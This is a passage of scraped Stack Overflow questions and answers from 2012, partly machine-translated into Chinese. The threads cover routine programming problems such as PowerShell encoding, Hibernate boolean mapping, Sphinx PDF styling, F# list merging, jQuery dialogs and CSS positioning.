    //here the code
}); 
```

# powershell - 无论是在本地运行还是在远程会话中运行，schtasks 的输出都采用不同的编码

> ID：13530473
> 
> 赞同：0
> 
> 时间：2012-11-23T13:52:18.167
> 
> 标签：powershell, powershell-remoting

我正在尝试检查我的服务器上的计划任务，并且我想使用后台作业和远程会话来加速脚本的执行。但是当我在远程会话中运行我的命令时，输出的文化（或编码？）与我的工作站不同。我尝试使用 New-PsSessionOption 但结果是一样的：

1.  本地运行 schtasks 以检查远程服务器，输出正常：

    ```
    PS>Get-Culture

    LCID             Name             DisplayName
    ----             ----             -----------
    1036             fr-FR            French (France)

    PS>schtasks -s servername /v /query /fo csv |ConvertFrom-Csv |select -first 1

    Nom de l'hôte                                             : servername
    Nom de la tâche                                           : \BITS_CCM_Incoming_{16
                                                                674A29-EDDD-43C3-9EF2-
                                                                2B2D64EFA6F5}
    Prochaine exécution                                       : 23/11/2012 22:38:00
    Statut                                                    : Prêt 
    ```

2.  打开远程会话并在本地运行 schtasks：

    ```
    PS>$pso = New-PSSessionOption -Culture "fr-fr"
    PS>etsn servername -SessionOption $pso
    [servername]: PS C:\> get-culture

    LCID             Name             DisplayName
    ----             ----             -----------
    1036             fr-FR            Français (France)
    [servername]: PS C:\> schtasks /query /v /fo csv |ConvertFrom-Csv |select -First 1

    Nom de l'h"te                                             : servername
    Nom de la tƒche                                           :     \BITS_CCM_Incoming_{16674A29-EDDD-43C3-9EF2-2B2D64EFA6F5}
    Prochaine ex'cution                                       : 23/11/2012 22:38:00
    Statut                                                    : Pr^t 
    ```

如您所见，尽管使用了相同的文化，但输出似乎具有不同的编码。如何处理？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T09:57:19.447

过了一会儿，我发现我可以使用 COM 对象“Schedule.Service”来检索不依赖于语言的任务信息：

```
icm -AsJob -JobName getTasks -ComputerName $servers -ScriptBlock{
    $Schedule = new-object -com("Schedule.Service")
    $Schedule.connect($env:computername)
    $Tasks = $Schedule.getfolder("\").gettasks(0)
    $Tasks | Select-Object  Name,Path,State,Enabled,LastRunTime,LastTaskResult
}

$resu=wait-job getTasks |receive-job
remove-Job getTasks

$resu|sort PSComputerName 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T17:06:29.920

我无法提供准确的答案，但请在本地和远程会话中检查 $OutputEncoding 和 [Console]::OutputEncoding。

配置远程会话以匹配工作/本地会话。

# java - javax.xml.ws.WebServiceException: is not a valid port

> ID：13530484
> 
> 赞同：1
> 
> 时间：2012-11-23T13:52:53.293
> 
> 标签：java, web-services, jax-ws

I'm tring to made a dinamic WS call using jax-ws.

But I can't create the dispatcher, the code is:

```
String namespace= "http://wsf.cdyne.com/WeatherWS/Weather.asmx";
try {
    QName serviceName = new QName(namespace, "GetCityForecastByZIP");
    Service s = Service.create(serviceName);
    QName portName = new QName(namespace, "WeatherSoap12");
    Dispatch<DOMSource> dispatch = s.createDispatch(portName,
                                                  DOMSource.class,
                                                  Service.Mode.PAYLOAD);
... 
```

The error is javax.xml.ws.WebServiceException: {http://wsf.cdyne.com/WeatherWS/Weather.asmx}WeatherSoap12 is not a valid port. Valid ports are:

I have ckect the WSDL at [http://wsf.cdyne.com/WeatherWS/Weather.asmx?WSDL](http://wsf.cdyne.com/WeatherWS/Weather.asmx?WSDL) and I can't identify the reason of the error.

Any help?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T08:37:56.863

SOLVED. The sample code used was incomplete, I need to add the port to the server

```
s.addPort(portName, SOAPBinding.SOAP12HTTP_BINDING, WSDL_ENDPOINT_URL); 
```

# java - 休眠：将布尔映射更改为's'/'n'？

> ID：13530486
> 
> 赞同：6
> 
> 时间：2012-11-23T13:53:01.323
> 
> 标签：java, hibernate

我目前正在尝试让 Hibernate 使用 Oracle 8 Legacy-Database。到目前为止一切正常，但现在我遇到了一个尚未解决的问题：数据库中的布尔值未保存为 'y'/'n' 或 't'/'f' 或 0/1 格式，但是因为该项目来自西班牙语地区，所以它被保存为 's'/'n' 表示 si/no。但是，Hibernate 显然不支持这一点。

有任何想法吗？我会感谢每一个正确方向的小指针。例如布尔映射是哪个类，所以我可以覆盖它/创建我自己的版本？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:02:29.237

AFAIK，您必须使用自己的 Dialect 类，扩展您当前使用的 Dialect 类，并覆盖 method `toBooleanValueString()`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:32:13.417

我知道的另一个扩展点是使用合同

org.hibernate.usertype.UserType

您需要实现的更重要的方法是 nullSafeSet 和 nullSafeGet。这些提供了必要的钩子，以便在 Hibernate “水合”对象之前将值从 ResultSet 转换为 java 对象，反之亦然。

例如

```
public Object nullSafeGet(ResultSet rs, String[] names, Object owner) throws HibernateException, SQLException {
        String value = rs.getString(names[0]);
        if(value==null) {
             //handle this
        }
        //handle other possibilities like Si/No or whatever here
        return "s".equals(value) ? Boolean.TRUE : Boolean.FALSE;
    }

    public void nullSafeSet(PreparedStatement st, Object value, int index) 
    throws HibernateException, SQLException {
        if (value==null) {
            //handle this
            return;
        }
        Boolean bValue = (Boolean) value;
        if(bValue) {
            st.setString("s", index);
        } else {
            st.setString("n", index);
        }
        //handle other possibilities like Si/No or whatever here
    } 
```

然后，让 Hibernate 知道您的 UserType 实现是一件简单的事情，您可以在 hibernate 映射中将其作为 typedef 元素执行，或者简单地使用 UserType 适用的属性元素的 type 属性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T14:39:34.723

这就是我在 Hibernate 中定义自定义类型的方式

```
public class CustomBooleanType extends BooleanType {

   public static final String TRUE = "s";
   public static final String FALSE = "n";

   public CustomBooleanType () {
      super(CharTypeDescriptor.INSTANCE, new BooleanTypeDescriptor(TRUE.charAt(0), FALSE.charAt(0)));
   }  
} 
```

# latex - 将笔记的背景颜色添加到 Sphinx 生成的 PDF 文件？

> ID：13530489
> 
> 赞同：5
> 
> 时间：2012-11-23T13:53:15.990
> 
> 标签：latex, python-sphinx, restructuredtext

我可以使用 Sphinx 指令生成笔记`.. notes::`。但是，html 文件中的注释有背景颜色，而生成的 PDF 中的注释没有。

如何为 Sphinx 生成的 PDF 文件添加颜色？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-01T17:19:50.107

您可以在您的文件中添加类似这样的内容（有关 LaTeX 输出的选项，`conf.py`请参阅[文档）：](http://sphinx-doc.org/config.html#confval-latex_elements)

```
latex_custom = r'''
\definecolor{Admonition}{RGB}{221,233,239}

\makeatletter
  \newenvironment{admonitionbox}{
    \begin{lrbox}{\@tempboxa}\begin{minipage}{\columnwidth}
  }{
    \end{minipage}\end{lrbox}
    \colorbox{Admonition}{\usebox{\@tempboxa}}
  }

  \renewenvironment{notice}[2]{
    \begin{admonitionbox}
  }{
    \end{admonitionbox}
  }
\makeatother
'''

latex_elements = {'preamble': latex_custom} 
```

这是一个基本示例，它将更改所有警告框（注意、警告、提示等）的背景颜色。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-13T12:25:42.233

我的解决方案受到尼古拉斯回答的启发。它建立在原始 sphinx 代码之上`./_build/latex/sphinx.sty`。与 Nicolas 的解决方案相比，这个方案保留了原始的 Sphinx 布局（间距、框架等）并为其添加了背景颜色。此外，它以不同的方式处理`lightbox`（注释、提示、提示、重要）和`heavybox`（警告、警告、注意、危险、错误）警告框样式。

在您的文件中添加以下代码`conf.py`（最终输出应如下[所示](http://i.stack.imgur.com/VEE3x.png)）：

```
latex_custom = r'''
\definecolor{AdmonitionHeavyColor}{RGB}{255,204,204}
\definecolor{AdmonitionLightColor}{RGB}{238,238,238}

\makeatletter

  \renewcommand{\py@heavybox}{
    \setlength{\fboxrule}{1pt}
    \setlength{\fboxsep}{6pt}
    \setlength{\py@noticelength}{\linewidth}
    \addtolength{\py@noticelength}{-4\fboxsep}
    \addtolength{\py@noticelength}{-2\fboxrule}
    %\setlength{\shadowsize}{3pt}
    \Sbox
    \minipage{\py@noticelength}
  }

  \renewcommand{\py@endheavybox}{
    \endminipage
    \endSbox
    \savebox{\@tempboxa}{\fbox{\TheSbox}}
    \colorbox{AdmonitionHeavyColor}{\usebox{\@tempboxa}}
  }

  \renewcommand{\py@lightbox}{
    {%
      \setlength\parskip{0pt}\par
      \noindent\rule[0ex]{\linewidth}{0.5pt}%
      %\par\noindent\vspace{-0.2ex}%
    }
    \setlength{\py@noticelength}{\linewidth}
    \setlength{\fboxrule}{0pt}
    \setlength{\fboxsep}{2pt}
    %\setlength{\py@noticelength}{\linewidth}
    \addtolength{\py@noticelength}{-4\fboxsep}
    \addtolength{\py@noticelength}{-2\fboxrule}
    \Sbox
    \minipage{\py@noticelength}
  }

  \renewcommand{\py@endlightbox}{
    \endminipage
    \endSbox
    \savebox{\@tempboxa}{\fbox{\TheSbox}}
    \colorbox{AdmonitionLightColor}{\usebox{\@tempboxa}}
    {%
      \setlength{\parskip}{0pt}%
      \par\noindent\rule[0.5ex]{\linewidth}{0.5pt}%
      \par\vspace{-0.5ex}%
    }
  }

\makeatother
'''

latex_elements = {'preamble': latex_custom} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-01-14T19:54:34.913

在较新的版本中，您可以使用in your的`sphinx_setup`键来相当容易地实现*一些*警告，例如：`latex_elements``conf.py`

 *```
latex_elements = {
    'sphinxsetup': 'warningBgColor={RGB}{255,204,204}'
} 
```

将警告背景颜色更改为红色。查看[文档](http://www.sphinx-doc.org/en/master/latex.html#the-latex-style-file-options)以获取更多信息。

在撰写本文时`noteBgColor`，这似乎不是一个选择，因此这对 OP 中的内容没有特别帮助，但可以帮助其他警告。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-07-25T08:38:42.667

使用 Latex if then else 为不同的警告创建不同颜色的框。将此添加到`conf.py`

```
latex_custom = r'''
    \makeatletter
    \usepackage{ifthen}
    \usepackage{tcolorbox}
    \tcbuselibrary{skins}
    \renewenvironment{sphinxadmonition}[2]
    {
       %Green colored box for Conditions
       \ifthenelse{\equal{#2}{Conditions}}{
                         \medskip
                         \begin{tcolorbox}[before={}, enhanced, colback=green!10, 
                                           colframe=green!65!black,fonttitle=\bfseries,
                                           title=\sphinxstrong{#2}, arc=0mm, drop fuzzy shadow=blue!50!black!50!white]}{

           %Blue colored box for Notes
           \ifthenelse{\equal{#2}{Note:}}{
                             \medskip
                             \begin{tcolorbox}[before={}, enhanced, colback=blue!5!white, 
                                               colframe=blue!75!black,fonttitle=\bfseries,
                                               title=\sphinxstrong{#2}, arc=0mm, drop fuzzy shadow=blue!50!black!50!white]}{
               %Orange colored box for Warnings 
               \ifthenelse{\equal{#2}{Warning:}}{
                             \medskip
                             \begin{tcolorbox}[before={}, enhanced, colback=orange!5!white, 
                                               colframe=orange!75!black,fonttitle=\bfseries,
                                               title=\sphinxstrong{#2}, arc=0mm, drop fuzzy shadow=blue!50!black!50!white]}{

                   %Red colored box for everthing else
                   \medskip
                   \begin{tcolorbox}[before={}, enhanced, colback=red!5!white, 
                                 colframe=red!75!black, fonttitle=\bfseries,
                                 title=\sphinxstrong{#2}, arc=0mm, drop fuzzy shadow=blue!50!black!50!white]}
           }
       }
    }
    {
       \end{tcolorbox}\par\bigskip
    } 

    \makeatother
'''

latex_elements['preamble'] += latex_custom 
```

输出是这样的[![在此处输入图像描述](../Images/48f5bd484f32087e4f695208b0960d6f.png)](https://i.stack.imgur.com/ptiLN.png) [![在此处输入图像描述](../Images/2fa581e41c76d4f378c2b5f542ac55fb.png)](https://i.stack.imgur.com/dLJqZ.png)*

# windows - VB6 VisualBasic6 API 是否适用于 Windows 8？

> ID：13530491
> 
> 赞同：5
> 
> 时间：2012-11-23T13:53:17.100
> 
> 标签：windows, vb.net, vb6

只有基本的 VB6 应用程序在 WIN8 上运行吗？是否有任何 API 在使用中有所不同，例如 GDI+、Keyhooks、FileSystem 或 RtlMoveMemory API。

VB6 是 x86，Win8 是 x64。

我已经阅读： [VB6 在 Windows 8 上运行？](https://stackoverflow.com/questions/4221661/vb6-running-on-windows-8)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T13:55:51.480

Windows 8 不会更改 Windows 桌面应用程序的基本 API。（当然 Windows RT 除外）

未来版本的 Windows 也不会；对这些 API 的任何更改都会破坏与所有现有应用程序的兼容性。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-05T15:10:26.610

我们刚刚开始在 Windows 8 x64 上测试我们的 VB6 应用程序。该应用程序庞大而复杂。一切似乎都可以正常工作，甚至是较旧的第三方 OCX 控件等。ADO/MDAC 可以很好地与各种版本的 SQL Server 配合使用。有很多 Win32 API 调用似乎也可以正常工作。我们还能够在 Windows 8 x64 上安装 VB6 IDE 以进行测试和调试。

然而，第一个问题是一个通用的 50003 错误和一条消息，说它无法创建主应用程序表单或类似的东西。进一步调查显示，出于某种原因，Windows 8 不喜欢某些嵌入在表单中的图标（它们存储在表单随附的 .frx 文件中，并在编译时嵌入到 .exe 中）。看来它可能与具有透明背景的图标有关。

该应用程序有大约。100 个受影响的表格。解决此问题后，该应用程序似乎可以正常工作。但这件事破坏了我们在 Windows 7 上运行良好的分发可执行文件（以及 Vista 和 XP 以及所有服务器版本，以及在 2000、Win98 和 Win95 上运行的旧版本）。它可以很容易地修复，但我们希望不必做任何事情。叹。

如果其他人看到这个或有任何提示或建议，我会很感兴趣。

PS @Hans Passant，Windows 7 SP1 ADO 问题已通过 KB2640696 修复。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-23T14:19:51.020

保持旧的 VB6 程序运行肯定越来越难。Windows 7 SP1 部署[了对 ADO 的过期更新，](https://stackoverflow.com/a/7415338/17034)这将阻止旧的 VB6 dbase 应用程序工作。[今年](https://stackoverflow.com/questions/12963442/warning-msb3283-cannot-find-wrapper-assembly-for-type-library-mscomctllib-wh)有两个针对 MSCOMCTL.OCX 的关键安全补丁，其中一个更改了 guid。

虽然您可以通过跳过这些更新来让旧机器运行旧的 VB6 应用程序，但 Windows 8 将让它们就位并且您无法恢复。您必须在具有这些更新的机器上重建您的应用程序，以便它使用新的类型库。如果这不是一个选项，那么虚拟机就是让它继续运行的方法。但是，我还没有看到对 Virtual XP Mode 的支持。

# gnuplot - 在同一个图表上绘制多个文件

> ID：13530493
> 
> 赞同：0
> 
> 时间：2012-11-23T13:53:37.427
> 
> 标签：gnuplot, tcpdump, tcptrace

我需要在同一张图上绘制由 tcptrace 生成的各种 xpl 文件的输出，以便图形比较变得更容易。注意：这里的 x 轴对于所有 xpl 文件都是通用的（时间）。只有y轴不同。我需要像 2 y 轴这样的东西。一个在左边一个在右边。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:07:24.290

You can see an example of how to set multiple axes [here](http://gnuplot.sourceforge.net/demo/multiaxis.html).

# list - 按 f# 顺序合并两个列表

> ID：13530495
> 
> 赞同：2
> 
> 时间：2012-11-23T13:53:38.377
> 
> 标签：list, f#

我有这个代码，它结合了两个列表：

```
let rec union list1 list2 =
    match list2 with
    | [] -> list1
    | x::xs when mem x list1 -> union list1 xs
    | x::xs -> x::(union list1 xs) 
```

但是，这并没有给我想要的结果；我希望结果按照最小的顺序排列。我该怎么做呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:59:56.150

如果这两个参数已经排序，那么您可以遍历它们并在结果中添加更小的元素：

```
let rec union list1 list2 =
    match list1, list2 with
    | [], other | other, [] -> other
    | x::xs, y::ys when x < y -> x :: (union xs list2)
    | x::xs, y::ys -> y :: (union list1 ys) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:01:25.973

即使您的输入未排序，这也将起作用：

```
let sortedUnion list1 list2 =
    let rec union list1 list2 =
        match list2 with
        | [] -> list1
        | x::xs when mem x list1 -> union list1 xs
        | x::xs -> x::(union list1 xs)
    let unsorted = union list1 list2
    List.sort unsorted 
```

# jquery - jQuery UI，等待对话框响应

> ID：13530500
> 
> 赞同：0
> 
> 时间：2012-11-23T13:53:48.983
> 
> 标签：jquery, jquery-ui, modal-dialog, jquery-ui-dialog

我正在构建一个简单的基于 Web 的文本编辑器，并尝试实现类似“保存更改？”的功能。当用户尝试打开文件并且当前文件有未保存的更改时的对话框。

代码是这样的：

```
function openFile() {
    if (hasChanges === true) {
       $("#save-changes-dialog).dialog("open");
    }

    // file opening stuff goes here
} 
```

这显然不起作用，因为对话框被打开，然后文件打开代码在打开对话框后立即运行，而不是等待该对话框的结果。

解决这个问题的最佳方法是什么？我尝试动态更改“保存更改”对话框中按钮的功能，以便对话框按钮本身调用文件打开代码，但这似乎有点混乱，而且由于一些原因，我也遇到了时间问题AJAX 调用。

这似乎会经常出现，但我似乎无法找到关于如何解决问题的明确答案。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:56:15.317

文件打开的东西不会去“这里”。它进入对话框的按钮处理程序。

当您定义对话框时：

```
$("#save-changes-dialog").dialog({
        resizable: false,
        modal: true,
        buttons: {
            Save: function() {
                // file opening stuff goes HERE instead!
            },
            Cancel: function() {
                $(this).dialog("close");
            }
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T13:58:36.263

尝试这个：

```
function checkForChanges() {
    if (hasChanges === true) {
       $("#save-changes-dialog").dialog("open");
       return false;
    }
    openFile();
}

function openFile(){
    // file opening stuff goes here
} 
```

以前调用 openFile 的任何地方现在都应该调用 checkForChanges，然后在您的对话框中，您可以在任何您希望的事件上调用 openFile()

# android - 设计布局，重用视图。最佳实践

> ID：13530507
> 
> 赞同：0
> 
> 时间：2012-11-23T13:54:25.693
> 
> 标签：android

我将在 Activity 中有几个相同的字段

例如

```
Fragment A
Age
Height

Fragment B
Age
Weight

Fragment C
Weight
Height 
```

我应该为每个片段创建布局还是“动态”显示我需要的字段

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:58:33.387

您可以使用[包含标签](http://developer.android.com/training/improving-layouts/reusing-layouts.html)。这是实现您正在寻找的东西的一种非常简单的方法。

# javascript - 通过javascript删除/重置css属性的正确方法是什么？

> ID：13530514
> 
> 赞同：12
> 
> 时间：2012-11-23T13:54:48.297
> 
> 标签：javascript, css

> **可能重复：**
> [如何使用 javascript 删除 css 属性？](https://stackoverflow.com/questions/2027935/how-to-remove-css-property-using-javascript)

我有这个 javascript：

```
var div = document.getElementById('myDiv');
div.style.width = '300px';
div.style.height = '200px';
... 
```

等等...

后来我面临删除属性的需要（不改变它的值，真正删除意义：就像我之前没有设置过一样）

我编写了这样的代码：

1.  div.style.height = 未定义；
2.  div.style.height = null;
3.  div.style.height = '';

只有解决方案 n.3 似乎有效，但即便如此......我不确定这是正确的方法（我只使用 chrome 来测试这个）

有谁知道正确的方法是什么？哪个适用于所有适当的浏览器？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:14:09.913

您可以使用`inherit`或`initial`重视。[http://www.w3.org/TR/css3-values/#common-keywords](http://www.w3.org/TR/css3-values/#common-keywords)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:59:39.753

没有“正确的方法”。微软曾经发明过 style.removeAttribute()，但不被支持。最好的方法是将其设置为标准值。

**编辑：**正如dystroy提到的，将它设置为“”会在所有浏览器中重置它，所以这将是最好的方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T14:32:53.747

I have just created a fiddle with the following code

HTML

```
 <div id="foo" style="height: 100px;"></div> 
```

CSS

```
#foo {
    height: 200px;
    background-color: yellow;   
} 
```

JavaScript

```
var el = document.getElementById("foo");
el.style.height = "auto"; 
```

Setting the property to auto actually sets the style attribute on the element to

```
<div id="foo" style="height: auto;"></div> 
```

and overrides the css height property applied to `#foo`. To reset a style, as mentioned by others set the element's style property to an empty string

```
el.style.height = ""; 
```

Fiddle [**here**](http://jsfiddle.net/bruno/gea3F/4/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-23T13:56:44.410

干得好：

```
div.style.height = "auto" 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T13:59:46.650

好吧，另一种选择可能是用于`getComputedStyle`获取当前样式属性，并在需要重置变量时调用该值。

```
var style = getComputedStyle(div);

div.origWidth = style. getPropertyValue("width");
div.origHeight = style. getPropertyValue("height"); 
```

[https://developer.mozilla.org/en-US/docs/DOM/window.getComputedStyle](https://developer.mozilla.org/en-US/docs/DOM/window.getComputedStyle)

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-11-23T13:58:46.963

我会使用文档中的 removeAttribute() 函数

```
document.getElementById("myDiv").removeAttribute("height") 
```

# java - 使用 VI SDK 将 VM 标记为模板并克隆 VM

> ID：13530516
> 
> 赞同：2
> 
> 时间：2012-11-23T13:55:00.817
> 
> 标签：java, sdk, vmware

我正在使用 Java 中的 VI SDK 编写应用程序。我当前的问题是，当我尝试将某个虚拟机标记为模板（使用方法 markAsTemplate()）时，我收到一个错误“com.vmware.vim25.NotSupported”并且我的 VClient 错误说：“操作是对象不支持”。尝试克隆虚拟机时会出现同样的错误。

我知道这可能与您是在 ESX 还是 VC 上运行有关。

我在 ESXi 上运行，但是从 VClient 中，我能够执行克隆任务（甚至标记为模板），但是从我的应用程序中，我根本无法...

任何意见，将不胜感激。

Ps 如果有人需要查看我的代码，我也可以将其包含在这篇文章中。但主要是看看这是否可能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T16:20:15.277

如果您直接连接到 ESX 或 ESXi 主机而不是 vCenter 实例，这将失败。以编程方式将 VM 标记为模板的要求与来自 vSphere Client 的要求相同。

您`NotSupported`从 VI SDK 中遇到了错误，VMware 文档中明确指出：

[http://pubs.vmware.com/vsphere-51/topic/com.vmware.wssdk.apiref.doc/vmodl.fault.NotSupported.html](http://pubs.vmware.com/vsphere-51/topic/com.vmware.wssdk.apiref.doc/vmodl.fault.NotSupported.html)

> “如果服务器不支持该方法，则抛出该方法。并非所有服务器都支持所有方法（例如，ESX Server 主机支持的功能少于 VirtualCenter 服务器）。也可能由于缺少许可证而禁用某个功能。”

# jquery-cycle - 在jQuery循环中集中对齐图像

> ID：13530517
> 
> 赞同：1
> 
> 时间：2012-11-23T13:55:00.987
> 
> 标签：jquery-cycle, alignment

我正在使用 jquery 循环来翻阅一些图像，但图像向左对齐而不是在 div 的中心。但是，一旦删除 jquery 代码，图像就会居中对齐，我只是不知道 jquery 代码的哪一部分迫使它离开？有关演示，请参见[http://jsfiddle.net/ZdLDD/4/](http://jsfiddle.net/ZdLDD/4/)

我想要绿色框中间的图像，这样左右的空间是均匀的

```
<div id="samples">
                <ul id="sssnav">
                  <li id="sprev"><a href="#">Previous</a></li>
                  <li id="snext"><a href="#">Next</a></li>
                </ul>

                <ul id="sslides">
                  <li><img src="http://i45.tinypic.com/33wl55t.jpg" alt="" /><div id="samplestext">text</div></li>
                  <li><img src="http://i45.tinypic.com/33wl55t.jpg" alt="" /></li>
                </ul>
            </div> 
```

# c# - DataGridViewComboBox 索引更改事件故障

> ID：13530519
> 
> 赞同：0
> 
> 时间：2012-11-23T13:55:21.467
> 
> 标签：c#, datagridview, datagridviewcombobox

希望有人可以帮助解决这个问题。我的代码中有一个无法修复的错误。我正在使用带有 DataGridView 控件的选定索引事件处理进行测试。

我创建了两列：-

第 0 列是`DataGridViewTextBoxColum` 第 1 列是`DataGridViewComboBoxColumn`

我给了我的`ComboBox`Column 一个数据源，它很小`DataTable`，由两个`Username`&列组成`UserID`。

显示成员设置为用户名列，我将用户 ID 列设置为值成员。

我要做的只是第 0 列（ ），在索引更改事件中`DataGridViewTextBox`填充`UserID`（ ） 。`ValueMember``DataGridViewComboBoxColumn`

当我第一次加载程序时它工作正常。事件`IndexChanged`触发没有任何错误。但是，如果我尝试`ComboBox`在新行中选择 ，它会从上一行清除组合框中的值，然后抛出空引用异常。

我列出了下面的代码并突出显示了它失败的代码行：-

```
public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            LoadData();
        }

        public OleDbConnection con = new OleDbConnection(@"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=C:\Documents and Settings\riversd\Desktop\Test.accdb");

        public string sql = "SELECT * FROM [AgentList]";

        private void LoadData()
        {
            dataGridView1.EditMode = DataGridViewEditMode.EditOnEnter;

            DataTable dt = AgentTable(sql, con);

            DataGridViewTextBoxColumn textbox = new DataGridViewTextBoxColumn();
            dataGridView1.Columns.Add(textbox);

            DataGridViewComboBoxColumn combo = new DataGridViewComboBoxColumn();
            combo.DataSource = dt;
            combo.DisplayMember = "agentName";
            combo.ValueMember = "AgentID";

            dataGridView1.Columns.Add(combo);

        }

        public DataTable AgentTable(string SQL, OleDbConnection con)
        {
            var AgentList = new DataTable();
            var SELECTcommand = new OleDbCommand(SQL, con);
            var adaptor = new OleDbDataAdapter();

            adaptor.SelectCommand = SELECTcommand;

            con.Open();
            adaptor.SelectCommand.ExecuteNonQuery();
            adaptor.Fill(AgentList);
            con.Close();

            return AgentList;
        }

        private void dataGridView1_CurrentCellDirtyStateChanged(object sender, EventArgs e)
        {
            DataGridViewColumn col = dataGridView1.Columns[dataGridView1.CurrentCell.ColumnIndex];
            if (col is DataGridViewComboBoxColumn)
            {
                dataGridView1.CommitEdit(DataGridViewDataErrorContexts.Commit);
            }
        }

        private void dataGridView1_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
        {
            if (dataGridView1.CurrentCell.ColumnIndex == 1 && e.Control is ComboBox)
            {

                ComboBox comboBox = e.Control as ComboBox;
                comboBox.SelectedIndexChanged += LastColumnComboSelectionChanged;
            }
        }

        private void LastColumnComboSelectionChanged(object sender, EventArgs e)
        {   
            var currentcell = dataGridView1.CurrentCellAddress;
            var sendingCB = sender as DataGridViewComboBoxEditingControl;
            DataGridViewTextBoxCell cel = (DataGridViewTextBoxCell)dataGridView1.Rows[currentcell.Y].Cells[0];

            // HERE IS THE LINE THAT THROES EXCEPTION WHEN MOVING FROM
            // ONE COMBOXCELL to another.
            cel.Value = sendingCB.SelectedValue.ToString();

        }

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-07T07:50:01.107

尝试换行：-
`DataGridViewTextBoxCell cel = (DataGridViewTextBoxCell)dataGridView1.Rows[currentcell.Y].Cells[0];`

至

`DataGridViewTextBoxCell cel = (DataGridViewTextBoxCell)dataGridView1.Rows[currentcell.Y].Cells[1];`

# notifications - BizTalk - 传递通知上的路由失败

> ID：13530531
> 
> 赞同：7
> 
> 时间：2012-11-23T13:55:56.090
> 
> 标签：notifications, biztalk

我最近遇到了一个非常奇怪的问题，即删除通知。这是场景：

*   我有一个编排，它将消息发送到配置为传递通知 = 已传输的单向发送端口（顺便说一句，发送端口使用 FTP 适配器，但我认为适配器是什么并不重要）。

*   当出现消息传递错误时，该错误被编排捕获（因此意味着传递通知机制按预期工作），它执行一些日志记录，然后以编程方式终止（终止形状）。消息传递实例仍然存在并且被挂起和恢复。

*   在解决了导致消息传递错误的问题后，我恢复了暂停的消息传递实例。

在这一点上，我得到了 2 个非常可疑的消息传递实例：ACK 的路由失败并且消息传递实例仍然处于活动状态（但什么也不做......）。我确信路由失败实例是与活动消息传递实例相关的传递通知，因为它们具有相同的 CorrelationToken。更多细节：如果我终止活动实例，它会被挂起（不可恢复），并且错误消息说实例完成但没有消耗所有消息！

最后但并非最不重要的一点是，我只在某些环境中遇到这个问题......

**更新**：似乎问题出现在运行 BizTalk 2006 R2 SP1 的 BizTalk 盒子上。在没有 SP1 的情况下运行 BizTalk 2006 R2 的机器上从未出现过这种情况。我会尽快确认

**更新 2**：看来我在上次更新中是对的：安装 SP1 CU1 后出现问题...所以下一步：我将尝试查找以下 CU 之一是否可以解决问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T14:11:23.427

实际上，没有 CU 可以纠正所描述的问题。但还有更多：似乎所有较新的 BizTalk 版本都受到关注：我已经在 BizTalk 2009 和所有 CU 和 BizTalk 2010 上进行了测试，问题仍然存在！

我发现的唯一解决方案是创建一个订阅所有交付通知的编排......不是很干净，但它可以完成工作 - 至少大部分都很好。

事实上，当您为带有**传递通知****的失败消息启用路由**时，我发现了另外一个问题：AckRequired 属性和相关令牌被复制到路由失败消息，这意味着如果此失败消息是，则将发布 ACK由发送端口（例如：ESB 异常发送端口）使用，并且如果该 ACK 仍在执行，则可以将其路由到原始编排。如果是这样，那将以典型的**僵尸消息**情况结束，因为编排不会使用此 ACK！现在，尝试向您的客户解释您的开发人员不应受到责备......：p

# css - 使用 position:fixed 删除空格。与其他元素冲突

> ID：13530537
> 
> 赞同：0
> 
> 时间：2012-11-23T13:56:11.720
> 
> 标签：css

在我的页面中，我将有两个这样的 div

```
<div style="position:fixed;width:100%;height: 100px;">

</div>

<div>
     something!
</div> 
```

我的问题是“某事” div 没有考虑第一个 div 的高度，而是在它之下。当我删除**位置时：固定；**一切恢复正常。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T13:58:03.800

那是因为您需要使用`position:absolute`or`position:relative`代替。制作`fixed`div 使其独立于其他 div，因为无论如何它都是固定元素。

例子：

```
<div style="position:absolute;width:100%;height: 100px; background-color:red;">
header
</div>

<div>
...
</div>​​​​​​​​​​​​​​​​​​​​​​​​ 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-11-23T13:59:07.367

使用 padding-top:100px 制作第二个 div

```
<div style="position:fixed;width:100%;height: 100px;">

</div>

<div style="padding-top:100px">
 something!
</div> 
```

# xaml - Windows 应用商店 - 动态样式

> ID：13530540
> 
> 赞同：1
> 
> 时间：2012-11-23T13:56:14.213
> 
